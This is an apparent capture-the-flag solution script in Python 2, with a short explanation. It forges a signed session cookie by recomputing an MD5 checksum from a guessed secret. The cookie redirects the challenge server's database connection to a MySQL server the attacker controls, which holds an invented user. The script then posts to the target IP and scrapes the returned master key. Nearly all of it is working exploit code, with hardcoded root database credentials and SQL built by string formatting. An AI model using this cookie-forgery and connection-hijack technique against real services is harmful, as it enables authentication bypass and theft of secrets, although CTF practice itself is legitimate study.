'''

In this problem you need to have a server accesible throw a public ID and a sql
databaseee up and running on it (prepare it to receive querys from remote clients!).

Once this database is setted up, we just modify the cookies we receive from
the enigma to make the server access our server insted of their own. We only must
create a user in our database and make the server ask for that user we have just 
created.

We must take into account that we have to create a 'checksum' valid for our new
cookies. This is really easy, because they use the password which appears in 
/etc/passwd, but these password are usually encripted and stored in another file.
In this case, instead of the password appears an 'x', so we know how to generate
valid 'checksums' for invented sequences.

This code creates the database, the tables, the content of the table and after it
finishes deletes everything. 

'''

#!/usr/bin/env python

import hashlib    
import sqlalchemy
import pycurl
import urllib
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy import Column, String
from sqlalchemy.orm import sessionmaker



config = {  "engine" : "mysql+mysqldb",
            "user" : "root",
            "password" :"root",
            "host" :"zape.pc.ac.upc.edu",
            "db":"test",
            "default_db":""
         }

Base = declarative_base()
class UsersTable(Base):
    __tablename__ = 'users'
    name = Column(String, primary_key=True)
    passwd =  Column(String)

def generateSig(data):
    return hashlib.md5('x' + data.lower()).hexdigest()

def dropDatabase():
    #print "Starting dropping database %s" % (config['db'])
    engine = sqlalchemy.create_engine(config['engine'] + "://"+config['user']+":"+config['password']+"@"+config['host']+config['default_db'])
    conn = engine.connect()
    conn.execute("commit")
    try:
        conn.execute('drop database %s' % (config['db']))
        #print "SUCCEED: deleted database %s" % (config['db'])
    except:
        conn.execute('rollback')
        #print "ERROR: could not delete database %s" % (config['db'])
    conn.close()

def createDatabase(user, password):
    engine = sqlalchemy.create_engine(config['engine'] + "://"+config['user']+":"+config['password']+"@"+config['host']+config['default_db'])
    conn = engine.connect()
    conn.execute("commit")
    conn.execute('create database %s' % (config['db']))
    conn.close()

    engine = sqlalchemy.create_engine(config['engine'] + "://"+config['user']+":"+config['password']+"@"+config['host']+"/"+config['db'])
    conn = engine.connect()
    conn.execute('CREATE TABLE users ( name varchar(255), passwd varchar(255) );')
    conn.execute('INSERT INTO users (name,passwd) VALUES (\'%s\',\'%s\');' % (user, password))
    conn.close()
    
def sendPostRequest(user, password):
    class ex:
        def __init__(self):
            self.contents = ''
        
        def body_callback(self, buf):
            self.contents = self.contents + buf

    e = ex()
    p = pycurl.Curl()
    p.setopt(pycurl.URL, "http://54.83.207.93:5252")
    p.setopt(pycurl.POST, 1)
    p.setopt(pycurl.COOKIEFILE, 'cookie_file.cookie')
    p.setopt(pycurl.POSTFIELDS, urllib.urlencode({'user':user, 'password':password}))
    p.setopt(pycurl.WRITEFUNCTION, e.body_callback)
    p.perform()
    return e.contents

def createCookieFile(config_data):
    sig = generateSig(config_data)
    f = open("cookie_file.cookie", 'w')
    f.write('Set-Cookie: sig=%s\n' % sig)
    f.write('Set-Cookie: config=%s\n' % config_data)
    f.close()

def plotPassword(input_lines):
    return [line.split("Your KEY is: ")[1].split("<")[0] for line in input_lines if "MASTER" in line][0]

chosen_username = "invented"
chosen_password = "invented"

dropDatabase()
createDatabase(chosen_username, chosen_password)
config_data = "app_name%3D" + "inventada"+ "%26db_name%3D" + config["db"] + "%26db_user%3D" + config["user"] + "%26db_passwd%3D" + config["password"] + "%26db_host%3D" + config["host"] 
createCookieFile(config_data)
received_response = sendPostRequest(chosen_username, chosen_password)
dropDatabase()

print plotPassword(received_response)
